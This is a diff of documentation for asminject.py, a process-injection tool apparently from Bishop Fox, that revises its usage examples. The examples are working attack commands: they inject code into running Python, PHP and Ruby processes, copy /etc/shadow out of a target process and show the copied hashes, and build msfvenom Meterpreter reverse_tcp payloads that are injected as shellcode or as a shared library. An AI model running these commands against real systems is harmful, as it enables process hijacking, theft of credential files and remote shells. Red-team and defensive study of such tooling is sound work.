@@ -31,75 +31,18 @@ This payload requires two variables: `sourcefile` and `destfile`.
 ```
 # ps auxww | grep python3 | grep -v grep
 
-user     2036577  1.8  0.2  16920 10288 pts/3    S+   12:41   0:00 python3 practice/python_loop.py
+root     2036577  [...] python3 practice/python_loop.py
 
-# python3 ./asminject.py 2036577 asm/x86-64/copy_file_using_syscalls.s --var sourcefile "/etc/passwd" --var destfile "/tmp/bishopfox.txt"
+# python3 ./asminject.py 2036577 copy_file_using_syscalls.s \
+   --var sourcefile "/etc/shadow" --var destfile "/tmp/bishopfox.txt"
 
-                     .__            __               __
-  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
- / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
-/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
-\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
-        \/                   \/\______|    \/     \/     \/|__|   \/
+...omitted for brevity...
 
-asminject.py
-v0.11
-Ben Lincoln, Bishop Fox, 2022-05-11
-https://github.com/BishopFox/asminject
-based on dlinject, which is Copyright (c) 2019 David Buchanan
-dlinject source: https://github.com/DavidBuchanan314/dlinject
-
-[!] A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.
-[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
-[*] /usr/bin/python3.9: 0x0000000000400000
-[*] /usr/lib/locale/locale-archive: 0x00007ff7aab92000
-[*] /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache: 0x00007ff7ab21d000
-[*] /usr/lib/x86_64-linux-gnu/ld-2.33.so: 0x00007ff7ab224000
-[*] /usr/lib/x86_64-linux-gnu/libc-2.33.so: 0x00007ff7aae7c000
-[*] /usr/lib/x86_64-linux-gnu/libdl-2.33.so: 0x00007ff7ab1fc000
-[*] /usr/lib/x86_64-linux-gnu/libexpat.so.1.8.3: 0x00007ff7ab085000
-[*] /usr/lib/x86_64-linux-gnu/libm-2.33.so: 0x00007ff7ab0b4000
-[*] /usr/lib/x86_64-linux-gnu/libpthread-2.33.so: 0x00007ff7ab047000
-[*] /usr/lib/x86_64-linux-gnu/libutil-2.33.so: 0x00007ff7ab1f7000
-[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007ff7ab068000
-[*] 0: 0x0000000000931000
-[*] [heap]: 0x000000000275e000
-[*] [stack]: 0x00007ffc1fbd6000
-[*] [vdso]: 0x00007ffc1fbfb000
-[*] [vvar]: 0x00007ffc1fbf7000
-[*] Validating ability to assemble stage 2 code
-[*] Validation assembly of stage 2 succeeded
-[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
-[*] Current process priority for asminject.py (PID: 2036595) is 0
-[*] Current CPU affinity for asminject.py (PID: 2036595) is [0, 1]
-[*] Current process priority for target process (PID: 2036577) is 0
-[*] Current CPU affinity for target process (PID: 2036577) is [0, 1]
-[*] Setting process priority for asminject.py (PID: 2036595) to -20
-[*] Setting process priority for target process (PID: 2036577) to 20
-[*] Setting CPU affinity for target process (PID: 2036577) to [0, 1]
-[*] RIP: 0x7ff7aaf706c4
-[*] RSP: 0x7ffc1fbf5430
-[*] Using: 0x006201c2 for 'ready for shellcode write' state value
-[*] Using: 0x005092ae for 'shellcode written' state value
-[*] Using: 0x0014f519 for 'ready for memory restore' state value
-[*] Wrote first stage shellcode at 0x00007ff7aaf706c4 in target process 2036577
-[*] Returning to normal time
-[*] Setting process priority for asminject.py (PID: 2036595) to 0
-[*] Setting process priority for target process (PID: 2036577) to 0
-[*] Setting CPU affinity for target process (PID: 2036577) to [0, 1]
-[*] Waiting for injected code to update the state value
-[*] Waiting for injected code to update the state value
-[*] Writing stage 2 to 0x00007ff7ab20d000 in target memory
-[*] Writing 0x00000000005092ae to 0x00007ffc1fbf6fd8 in target memory to indicate OK
-[*] Stage 2 proceeding
-[*] Waiting for injected code to update the state value
-[*] Restoring original memory content
-[+] Done!
-
-# cat /tmp/bishopfox.txt            
-                       
-root:x:0:0:root:/root:/usr/bin/zsh
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+# cat /tmp/shadow_copied_using_syscalls.txt 
+root:!:18704:0:99999:7:::
+daemon:*:18704:0:99999:7:::
+bin:*:18704:0:99999:7:::
+sys:*:18704:0:99999:7:::
 ...omitted for brevity...
 ```
 
@@ -115,22 +58,15 @@ $ sudo python3 practice/python_loop.py
 2022-05-12T19:46:56.264897 - Loop count 2
 ```
 
-In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed later in this document, as this is required for Python 3 specifically.
+In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed in <a href="docs/specialized_options.md#specifying-non-pic-code">specialized options</a>, as this is required for Python 3.9 specifically. For other Python versions, you may or may not need to exclude the option.
 
 This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.
 
-This payload requires relative offsets for the `python` binary used by the target process (e.g. for Python 3, something like `/usr/bin/python3.9`).
-
-```
-# ps auxww | grep python3 | grep -v grep
-
-...omitted for brevity...
-root     2037475  0.1  0.2  16988 10224 pts/9    S+   12:46   0:00 python3 practice/python_loop.py
-...omitted for brevity...
-
-# ./get_relative_offsets.sh /usr/bin/python3.9 > relative_offsets-python3.9.txt
-
-# python3 ./asminject.py 2037475 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-python3.9.txt --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();" --non-pic-binary "/usr/bin/python3\\.[0-9]+"
+# python3 ./asminject.py 2037475 execute_python_code.s \
+   --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/python3\\.[0-9]+" \
+   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
+   
 ...omitted for brevity...
 ```
 
@@ -147,12 +83,12 @@ sys:*:18704:0:99999:7:::
 
 ## Execute arbitrary Python code inside an existing Python 2 process
 
-If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option and specify relative offsets for the Python 2 binary instead of Python 3, e.g. same as the previous example, except:
+If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option, e.g. same as the previous example, except:
 
 ```
-# ./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt
-
-python3 ./asminject.py 2144294 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-python2.7.txt --relative-offsets --stop-method "slow" --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
+# python3 ./asminject.py 2144294 execute_python_code.s --relative-offsets-from-binaries \
+   --stop-method "slow" \
+   --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
 ```
 
 ## Execute arbitrary PHP code inside an existing PHP process
@@ -173,16 +109,17 @@ $ php practice/php_loop.php
 2022-05-12T13:41:01-0700 - Loop count 2
 ```
 
-In a separate window, get the appropriate `php` offsets, find the target process, and inject the code:
+In a separate window, find the target process, and inject the code:
 
 ```
-# ./get_relative_offsets.sh /usr/bin/php8.1 > relative_offsets-php8.1.txt
-
 # ps auxww | grep php | grep -v grep  
   
 root     2037629  1.0  0.5  68780 20212 pts/9    S+   13:40   0:00 php practice/php_loop.php
 
-# python3 ./asminject.py 2037629 asm/x86-64/execute_php_code.s --relative-offsets relative_offsets-php8.1.txt  --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP
+# python3 ./asminject.py 2037629 execute_php_code.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var phpcode "echo \\\"Injected PHP code\\\n\\\";" \
+   --var phpname PHP
 ```
 
 In the first window, note that the loop is interrupted by the injected code, e.g.:
@@ -215,16 +152,16 @@ $ ruby practice/ruby_loop.rb
 2022-05-12T13:41:01-0700 - Loop count 2
 ```
 
-In a separate window, get the appropriate `libruby` offsets, find the target process, and inject the code:
+In a separate window, find the target process, and inject the code:
 
 ```
-# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.4 > relative_offsets-libruby-2.7.4.txt
-
 # ps auxww | grep ruby | grep -v grep
 
 root     2037714  2.0  0.3  77888 13580 pts/9    S+   13:44   0:00 ruby practice/ruby_loop.rb
 
-# python3 ./asminject.py 2037714 asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-libruby-2.7.4.txt  --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
+# python3 ./asminject.py 2037714 execute_ruby_code.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var rubycode "puts(\\\"Injected Ruby code\\\")"
 ```
 
 In the first window, note that the loop is interrupted by the injected code, but fails to continue executing the original loop even though the process remains running:
@@ -233,7 +170,6 @@ In the first window, note that the loop is interrupted by the injected code, but
 2022-05-12T13:44:41-07:00 - Loop count 7
 2022-05-12T13:44:46-07:00 - Loop count 8
 Injected Ruby code
-
 ```
 
 ## Inject Meterpreter into an existing process
@@ -251,7 +187,8 @@ $ sudo python3 practice/python_loop.py
 In a separate terminal, generate a Meterpreter payload, then launch a listener:
 
 ```
-# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443
+# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw \
+   -o lmrt11443 LHOST=127.0.0.1 LPORT=11443
 
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -282,10 +219,11 @@ In a third terminal, locate the process and inject the Meterpreter payload into 
 ```
 # ps auxww | grep python3
 
-root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python3 practice/python_loop.py
-root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python3 practice/python_loop.py
+root     2144475  [...] sudo python3 practice/python_loop.py
+root     2144476  [...] python3 practice/python_loop.py
 
-# python3 ./asminject.py 2144476 asm/x86-64/execute_precompiled.s --stop-method "slow" --precompiled lmrt11443
+# python3 ./asminject.py 2144476 execute_precompiled.s \
+   --stop-method "slow" --precompiled lmrt11443
 
 ...omitted for brevity...
 ```
@@ -311,14 +249,14 @@ Warnings:
 
 ## Inject shellcode into a separate thread of an existing process
 
-The `` payload is identical to the `` payload described above, except it executes the precompiled binary shellcode in a separate thread. This allows the target process to continue executing normally.
+The `execute_precompiled_threaded.s` payload is identical to the `execute_precompiled.s` payload described above, except it executes the precompiled binary shellcode in a separate thread. This allows the target process to continue executing normally.
 
 This payload requires relative offsets for `libpthread` shared library used by the target process.
 
 ```
-# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libpthread-2.33.so > relative_offsets-libpthread-2.33.txt
-
-# python3 ./asminject.py 1955172 asm/x86-64/execute_precompiled_threaded.s --relative-offsets relative_offsets-libpthread-2.33.txt --stop-method "slow" --precompiled lmrt11443
+# python3 ./asminject.py 1955172 execute_precompiled_threaded.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --precompiled lmrt11443
 ```
 
 Warnings:
@@ -334,14 +272,15 @@ This payload requires one variable: `librarypath`, which should point to the lib
 This payload requires relative offsets for the `libdl` shared library used by the target process.
 
 ```
-# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443
+# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so \
+   -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443
 
-# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libdl-2.33.so > relative_offsets-libdl-2.33.txt
-
-# python3 ./asminject.py 1957286 asm/x86-64/dlinject.s --relative-offsets relative_offsets-libdl-2.33.txt  --stop-method "slow" --var librarypath "/home/user/lmrt11443.so"
+# python3 ./asminject.py 1957286 dlinject.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var librarypath "/home/user/lmrt11443.so"
 ```
 
-The injection comes with the same warnings as for `execute_precompiled.s*`, above.
+The injection comes with the same warnings as for `execute_precompiled.s`, above.
 
 ## Inject a Linux shared library (.so) file into a new thread in an existing process
 
@@ -354,11 +293,9 @@ This payload requires relative offsets for the `libdl` and `libpthread` shared l
 ```
 # msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443
 
-# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libdl-2.33.so > relative_offsets-libdl-2.33.txt
-
-# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libpthread-2.33.so > relative_offsets-libpthread-2.33.txt
-
-# python3 ./asminject.py 1957286 asm/x86-64/dlinject_threaded.s --relative-offsets relative_offsets-libdl-2.33.txt --relative-offsets relative_offsets-libpthread-2.33.txt --stop-method "slow" --var librarypath "/home/user/lmrt11443.so"
+# python3 ./asminject.py 1957286 dlinject_threaded.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var librarypath "/home/user/lmrt11443.so"
 ```
 
 This injection comes with the same warnings as for `execute_precompiled_threaded.s`, above.
@@ -370,5 +307,7 @@ If you don't mind making library calls, writing custom code is much easier than 
 This payload requires relative offsets for the `libc` shared library used by the target process.
 
 ```
-# python3 ./asminject.py 1876570 asm/x86-64/copy_file_using_libc.s --relative-offsets relative_offsets-libc-2.33.so.txt --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt" --debug
+# python3 ./asminject.py 1876570 copy_file_using_libc.s \
+   --relative-offsets-from-binaries --stop-method "slow" \
+   --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt"
 ```
